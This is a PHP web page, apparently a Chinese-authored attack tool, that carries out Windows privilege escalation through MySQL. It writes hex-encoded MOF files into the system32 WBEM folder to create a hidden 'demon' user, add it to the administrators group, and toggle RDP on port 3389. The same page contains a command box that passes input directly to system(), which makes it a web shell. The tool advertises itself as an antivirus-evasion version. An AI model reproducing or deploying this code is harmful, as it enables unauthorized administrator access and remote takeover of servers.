<?php
#
#  作者：Demon
#  时间：2018-1-13
#  联系：demonxian3@qq.com
#  博客：http://www.cnblogs.com/demonxian3
#  功能：MOF提权
#  原理：将MOF代码（含创建管理员用户的DOS命令）写入到数据库中
#        通过数据库导出到c:/windows/system32/wbem/mof/nullevt.mof
#        即可实现提权

session_start();
error_reporting(0);	//关闭错误报告
extract($_GET);		//将数组键和值转成变量和值，冲突默认覆盖
extract($_POST);	//如：$_POST['a']=3   转变成  $a=3

$host = isset($_SESSION['myhostname'])?$_SESSION['myhostname']:"localhost";
$user = isset($_SESSION['myusername'])?$_SESSION['myusername']:"root";
$pass = isset($_SESSION['mypassword'])?$_SESSION['mypassword']:"";
$base = isset($_SESSION['mydatabase'])?$_SESSION['mydatabase']:"mysql";

?>

<meta http-equiv="content-type" content="text/html;charset=gb2312">
<title>Demon专用MOF提权（免杀版）</title>
<body >
<h1 style="font-family:Arial Black;text-shadow: 0 0 23px white;text-align:center;color:red">Demon专用MOF提权</h1>
<hr>

<div style="width:1000px;margin:auto">
说明：键入nullevt.mof成功后需要等上1分钟左右才会生效，3389功能测试失败，但是代码是没问题的，可以在DOS命令手工开启<br>
<div style="width:300px;margin:auto">
<form method='post' action=''>
<table>
<tr><td>HOST: </td><td><input id="host" name="my_hostname" value="<?php echo $host;?>" onclick="this.value=''" ></td></tr>
<tr><td>USER: </td><td><input id="user" name="my_username" value="<?php echo $user;?>" onclick="this.value=''" ></td></tr>
<tr><td>PASS: </td><td><input id="pass" name="my_password" value="<?php echo $pass;?>" onclick="this.value=''" ></td></tr>
<tr><td>BASE: </td><td><input id="base" name="my_database" value="<?php echo $base;?>" onclick="this.value=''" ></td></tr>
<input type="hidden" name="beginWriteMof" value="1">
</table>
<select name="fun" style="width:198px;">
  <option value="1">添加Demon用户</option>
  <option value="2">加入管理员组</option>
  <option value="3">开3389端口</option>
  <option value="4">关3389端口</option>
</select><br>
<input id="subm" type="submit" value="一键植入nullevt.mof" style="width:200px;cursor:pointer"/>
</form>
</div>
<form>
  执行DOS命令:<br><textarea name="cmd"></textarea>
  <input type="submit" value="提交">
</form>

<?php
  if(isset($cmd)){
    echo "<pre style='color:green'>";
    system($cmd);
    echo "</pre>";
  }
?>


<?php

/* 初始化变量 */
if(!isset($my_hostname))$my_hostname = 'localhost';
if(!isset($my_username))$my_username = 'root';
if(!isset($my_password))$my_password = '';
if(!isset($my_database))$my_database = 'mysql';
if(!isset($install))$install = false;


/*开始植入MOF文件*/
if(isset($beginWriteMof)){
  mysql_connect($my_hostname,$my_username,$my_password) or die("连接数据库错误： ".mysql_error());

  $_SESSION['myhostname'] = $my_hostname;
  $_SESSION['myusername'] = $my_username;
  $_SESSION['mypassword'] = $my_password;
  $_SESSION['mydatabase'] = $my_database;

  mysql_select_db($my_database) or die("切换数据库错误： ".mysql_error());
  echo "数据库连接成功<br>";
  
  @mysql_query("drop table if exists demonTmpMof ");
  mysql_query("create table demonTmpMof(data LONGBLOB)") or die(mysql_error());


  if($fun == '1') $MOFcode = getcode_CreateUser();
  else if($fun == '2') $MOFcode = getcode_JoinAdmin();
  else if($fun == '3') $MOFcode = getcode_Open3389();
  else if($fun == '4') $MOFcode = getcode_Close3389();

  
  
  $res = mysql_query("select @@basedir") or die(mysql_error());
  $basepath = mysql_fetch_assoc($res);
  $basepath['@@basedir'].="data/" .$my_database. "/nullevt.mof";
  
  $dates = date('YmdHis');
  $oldfile = $basepath['@@basedir'];  		#@@basedir/data/$my_database/null.mof
  $newfile = 'c:/windows/system32/wbem/mof/nullevt'.$dates.'.mof';
  
  mysql_query("set @DemonMof=concat('',$MOFcode)");
  mysql_query("insert into demonTmpMof values('')");
  mysql_query("update demonTmpMof set data=@DemonMof");

  if(file_exists($oldfile))unlink($oldfile);		#overwrite;
  mysql_query("select data from demonTmpMof into dumpfile 'nullevt.mof'") or die("写入失败".mysql_error());

  @mysql_query("drop table demonTmpMof");

  if(file_exists($newfile) || !file_exists($oldfile))echo "target file is exists or old file is not exists<br>";
  else
    rename($oldfile,$newfile);
  
  echo "<br>恭喜，写入成功，过一段时间就会生效";

}

function getCode_CreateUser(){
  return '0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E22290D0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C7465720D0A7B0D0A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B0D0A202020204E616D6520203D202266696C745032223B0D0A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E7420220D0A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C2220220D0A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B0D0A2020202051756572794C616E6775616765203D202257514C223B0D0A7D3B0D0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D65720D0A7B0D0A202020204E616D65203D2022636F6E735043535632223B0D0A20202020536372697074696E67456E67696E65203D20224A536372697074223B0D0A2020202053637269707454657874203D0D0A202020202276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E65786520757365722064656D6F6E20313233343536202F6164645C2229223B0D0A7D3B0D0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E670D0A7B0D0A20202020436F6E73756D65722020203D2024436F6E73756D65723B0D0A2020202046696C746572203D20244576656E7446696C7465723B0D0A7D3B';
}

function getCode_JoinAdmin(){
  return '0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E22290D0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C7465727B0D0A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B0D0A202020204E616D6520203D202266696C745032223B0D0A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E7420220D0A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C2220220D0A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B0D0A2020202051756572794C616E6775616765203D202257514C223B0D0A7D3B0D0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D65727B0D0A202020204E616D65203D2022636F6E735043535632223B0D0A20202020536372697074696E67456E67696E65203D20224A536372697074223B0D0A2020202053637269707454657874203D0D0A202020202276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F72732064656D6F6E202F6164645C2229223B0D0A7D3B0D0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E677B0D0A20202020436F6E73756D65722020203D2024436F6E73756D65723B0D0A2020202046696C746572203D20244576656E7446696C7465723B0D0A7D3B';
}

function getCode_Open3389(){
  return '0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E22290D0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C7465727B0D0A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B0D0A202020204E616D6520203D202266696C745032223B0D0A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E7420220D0A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C2220220D0A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B0D0A2020202051756572794C616E6775616765203D202257514C223B0D0A7D3B0D0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D65727B0D0A202020204E616D65203D2022636F6E735043535632223B0D0A20202020536372697074696E67456E67696E65203D20224A536372697074223B0D0A2020202053637269707454657874203D0D0A2020202022766172207773203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E77732E72756E285C2252454720616464205C225C22484B4C4D5C5C53595354454D5C5C43757272656E74436F6E74726F6C5365745C5C436F6E74726F6C5C5C5465726D696E616C205365727665725C225C22202F76206644656E795453436F6E6E656374696F6E73202F74205245475F44574F5244202F642030202F665C2229223B0D0A7D3B0D0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E677B0D0A20202020436F6E73756D65722020203D2024436F6E73756D65723B0D0A2020202046696C746572203D20244576656E7446696C7465723B0D0A7D3B';
}

function getCode_Close3389(){
  return '23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E22290D0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C7465727B0D0A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B0D0A202020204E616D6520203D202266696C745032223B0D0A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E7420220D0A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C2220220D0A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B0D0A2020202051756572794C616E6775616765203D202257514C223B0D0A7D3B0D0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D65727B0D0A202020204E616D65203D2022636F6E735043535632223B0D0A20202020536372697074696E67456E67696E65203D20224A536372697074223B0D0A2020202053637269707454657874203D0D0A2020202022766172207773203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E77732E72756E285C2252454720616464205C225C22484B4C4D5C5C53595354454D5C5C43757272656E74436F6E74726F6C5365745C5C436F6E74726F6C5C5C5465726D696E616C205365727665725C225C22202F76206644656E795453436F6E6E656374696F6E73202F74205245475F44574F5244202F642031202F665C2229223B0D0A7D3B0D0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E677B0D0A20202020436F6E73756D65722020203D2024436F6E73756D65723B0D0A2020202046696C746572203D20244576656E7446696C7465723B0D0A7D3B';
}

?>